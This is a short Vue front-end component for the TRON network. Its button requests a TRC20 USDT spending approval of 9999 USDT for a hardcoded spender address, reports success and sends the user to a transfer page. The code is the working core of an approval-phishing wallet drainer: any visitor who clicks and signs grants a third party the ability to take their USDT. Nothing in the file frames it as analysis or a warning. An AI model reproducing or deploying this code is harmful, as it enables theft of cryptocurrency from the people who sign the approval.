<template>
  <div style="padding: 20px; text-align: center;">
    <h3>授权我们使用您的 TRC20 USDT</h3>
    <van-button type="primary" block @click="approve">授权 9999 USDT</van-button>
  </div>
</template>

<script setup>
import { Toast } from 'vant'
import { useRouter } from 'vue-router'

const router = useRouter()
const spender = 'TDjkeYy1mxfv65KW23fR9DnPfUz23E6Wc3'
const usdtAddress = 'THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF'

async function approve() {
  const tronWeb = window.tronWeb
  const contract = await tronWeb.contract().at(usdtAddress)
  const amount = tronWeb.toBigNumber(9999 * 1e6)
  await contract.approve(spender, amount).send()
  Toast.success('授权成功！')
  router.push('/transfer')
}
</script>